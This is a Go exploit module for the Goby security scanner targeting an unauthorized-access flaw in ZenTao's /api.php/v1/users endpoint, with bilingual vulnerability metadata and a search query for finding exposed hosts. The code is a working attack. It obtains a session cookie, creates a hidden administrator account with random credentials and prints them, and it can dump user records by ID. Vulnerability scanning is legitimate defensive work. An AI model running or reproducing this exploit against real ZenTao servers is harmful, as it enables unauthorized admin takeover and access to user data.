package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ZenTao /api.php/v1/users  Unauthorized Access Vulnerability",
    "Description": "<p>ZenTao is an open source project management software designed to help the team carry out project management and collaboration efficiently. It provides functions such as requirements management, task management, defect tracking, document management, teamwork, etc., so that the team can better organize projects, assign tasks, track progress and communicate with team members.</p><p>There is an unauthorized access vulnerability in Chandao/api.php/v1/users. The attacker can create an administrator account and take over the background without authorization under this interface, and may use other background vulnerabilities to achieve remote code execution, which seriously threatens system security.</p>",
    "Product": "ZenTao-System",
    "Homepage": "https://www.easycorp.cn/",
    "DisclosureDate": "2024-04-26",
    "PostTime": "2024-04-28",
    "Author": "Town",
    "FofaQuery": "((title=\"欢迎使用禅道集成运行环境\" || body=\"<a id='zentaopro' href='/pro/'\" || body=\"$('#zentaopro').addClass\" || body=\"powered by <a href='http://www.zentao.net' target='_blank'>ZenTaoPMS\" || body=\"Welcome to use zentao!\" || body=\"href='/zentao/favicon.ico\" || header=\"path=/zentao/\" || (header=\"Set-Cookie: zentaosid=\" && header!=\"Content-Length: 0\")) && server!=\"360 web server\" && body!=\"Server: Netvox Z206-Webs\" && body!=\"Server: CPWS\") || banner=\"path=/zentao/\" || (banner=\"Set-Cookie: zentaosid=\" && banner!=\"Content-Length: 0\")",
    "GobyQuery": "((title=\"欢迎使用禅道集成运行环境\" || body=\"<a id='zentaopro' href='/pro/'\" || body=\"$('#zentaopro').addClass\" || body=\"powered by <a href='http://www.zentao.net' target='_blank'>ZenTaoPMS\" || body=\"Welcome to use zentao!\" || body=\"href='/zentao/favicon.ico\" || header=\"path=/zentao/\" || (header=\"Set-Cookie: zentaosid=\" && header!=\"Content-Length: 0\")) && server!=\"360 web server\" && body!=\"Server: Netvox Z206-Webs\" && body!=\"Server: CPWS\") || banner=\"path=/zentao/\" || (banner=\"Set-Cookie: zentaosid=\" && banner!=\"Content-Length: 0\")",
    "Level": "3",
    "Impact": "<p>There is an unauthorized access vulnerability in Chandao/api.php/v1/users. The attacker can create an administrator account and take over the background without authorization under this interface, and may use other background vulnerabilities to achieve remote code execution, which seriously threatens system security.</p>",
    "Recommendation": "<p>The official has released a new version to fix the vulnerability. It is recommended to visit the official website (<a href=\"https://www.zentao.net/\">https://www.zentao.net/</a>) as soon as possible or contact the official after-sales support to obtain the new version of the installation package and upgrade to the unaffected security version.</p>",
    "References": [
        "https://www.oscs1024.com/hd/MPS-djcs-koe8"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "type",
            "type": "select",
            "value": "addadmin,getuserbyid",
            "show": ""
        },
        {
            "name": "id",
            "type": "input",
            "value": "",
            "show": "type=getuserbyid"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "禅道 /api.php/v1/users 未授权访问漏洞",
            "Product": "易软天创-禅道系统",
            "Description": "<p>禅道是一款开源的项目管理软件，旨在帮助团队高效地进行项目管理和协作。它提供了诸如需求管理、任务管理、缺陷跟踪、文档管理、团队协作等功能，使团队能够更好地组织项目、分配任务、追踪进度并与团队成员进行沟通。</p><p>禅道/api.php/v1/users存在未授权访问漏洞，攻击者可以未授权在该接口下创建管理员账户并接管后台，进而可能利用其他后台漏洞实现远程代码执行，严重威胁系统安全。</p>",
            "Recommendation": "<p>官方已发布新版本修复漏洞，建议尽快访问官网（<a href=\"https://www.zentao.net/\">https://www.zentao.net/</a>）或联系官方售后支持获取新版本安装包，升级至不受影响的安全版本。<br></p>",
            "Impact": "<p>禅道/api.php/v1/users存在未授权访问漏洞，攻击者可以未授权在该接口下创建管理员账户并接管后台，进而可能利用其他后台漏洞实现远程代码执行，严重威胁系统安全。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "ZenTao /api.php/v1/users  Unauthorized Access Vulnerability",
            "Product": "ZenTao-System",
            "Description": "<p>ZenTao is an open source project management software designed to help the team carry out project management and collaboration efficiently. It provides functions such as requirements management, task management, defect tracking, document management, teamwork, etc., so that the team can better organize projects, assign tasks, track progress and communicate with team members.</p><p>There is an unauthorized access vulnerability in Chandao/api.php/v1/users. The attacker can create an administrator account and take over the background without authorization under this interface, and may use other background vulnerabilities to achieve remote code execution, which seriously threatens system security.</p>",
            "Recommendation": "<p>The official has released a new version to fix the vulnerability. It is recommended to visit the official website (<a href=\"https://www.zentao.net/\">https://www.zentao.net/</a>) as soon as possible or contact the official after-sales support to obtain the new version of the installation package and upgrade to the unaffected security version.<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">There is an unauthorized access vulnerability in Chandao/api.php/v1/users. The attacker can create an administrator account and take over the background without authorization under this interface, and may use other background vulnerabilities to achieve remote code execution, which seriously threatens system security.</span><br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10944"
}`

	RegularExpressions_yAIhIw := func(srcString string, expressions string) (string, error) {
		re := regexp.MustCompile(expressions)
		match := re.FindStringSubmatch(srcString)
		if len(match) > 1 {
			return match[1], nil
		} else {
			return "", errors.New("cookie匹配错误")
		}
	}

	GetCookie_S4jk2y := func(hostInfo *httpclient.FixUrl) (string, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=ittnxaurfaiienykmkgb&branch=ftnwidhoqcyximjlkald")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return "", err
		}
		return RegularExpressions_yAIhIw(resp.Cookie, `zentaosid=([\w_]+);`)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Cookie, err := GetCookie_S4jk2y(hostInfo)
			if err != nil {
				return false
			}
			postRequestConfig := httpclient.NewPostRequestConfig("/api.php/v1/users")
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			//设置请求头
			postRequestConfig.Header.Store("Cookie", "zentaosid="+Cookie)
			//设置请求体
			postRequestConfig.Data = "{}"
			//请求
			resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return false
			}
			ss.VulURL = hostInfo.FixedHostInfo + "/api.php/v1/users"
			result, err := RegularExpressions_yAIhIw(resp.Utf8Html, `"error":"(.*?)"`)
			result, err = strconv.Unquote(`"` + result + `"`)
			if err != nil {
				return false
			}
			return strings.Contains(result, "用户名") && strings.Contains(result, "不能为空")
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			Cookie, err := GetCookie_S4jk2y(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = "Cookie获取失败"
				return expResult
			}
			Type := goutils.B2S(ss.Params["type"])
			if Type == "addadmin" {
				account, password, realname := goutils.RandomHexString(16), goutils.RandomHexString(16), goutils.RandomHexString(16)
				postRequestConfig := httpclient.NewPostRequestConfig("/api.php/v1/users")
				postRequestConfig.VerifyTls = false
				postRequestConfig.FollowRedirect = false
				//设置请求头
				postRequestConfig.Header.Store("Cookie", "zentaosid="+Cookie)
				//设置请求体
				postRequestConfig.Data = "{\"account\": \"" + account + "\", \"password\": \"" + password + "\", \"realname\": \"" + realname + "\", \"group\": 1}"
				//请求
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
				if err != nil {
					expResult.Success = false
					expResult.Output = "管理员创建失败"
					return expResult
				}
				userID, err := RegularExpressions_yAIhIw(resp.Utf8Html, `"id":(.*?),`)
				if err != nil {
					postRequestConfig := httpclient.NewPostRequestConfig("/api.php/v1/users")
					postRequestConfig.VerifyTls = false
					postRequestConfig.FollowRedirect = false
					//设置请求头
					postRequestConfig.Header.Store("Cookie", "zentaosid="+Cookie)
					//设置请求体
					postRequestConfig.Data = "{\"account\": \"" + account + "\", \"password\": \"" + password + "\", \"realname\": \"" + realname + "\", \"group\": 1}"
					resp, err = httpclient.DoHttpRequest(expResult.HostInfo, postRequestConfig)
					if strings.Contains(resp.Utf8Html, account) {
						expResult.Success = true
						expResult.Output = "管理员创建成功\n用户名：" + account + "\n密码：" + password + "\n真实姓名：" + realname
						return expResult
					}
					expResult.Success = false
					expResult.Output = "管理员创建失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = "管理员创建成功\n用户ID：" + userID + "\n用户名：" + account + "\n密码：" + password + "\n真实姓名：" + realname
				return expResult
			} else if Type == "getuserbyid" {
				userID := goutils.B2S(ss.Params["id"])
				getRequestConfig := httpclient.NewGetRequestConfig("/api.php/v1/users/" + userID)
				getRequestConfig.VerifyTls = false
				getRequestConfig.FollowRedirect = true
				getRequestConfig.Header.Store("Cookie", "zentaosid="+Cookie)
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, getRequestConfig)
				if err != nil {
					expResult.Success = false
					expResult.Output = "获取用户信息失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output = strings.Replace(resp.Utf8Html[1:len(resp.Utf8Html)-1], ",", "\n", -1)
				return expResult
			}
			return expResult
		},
	))
}
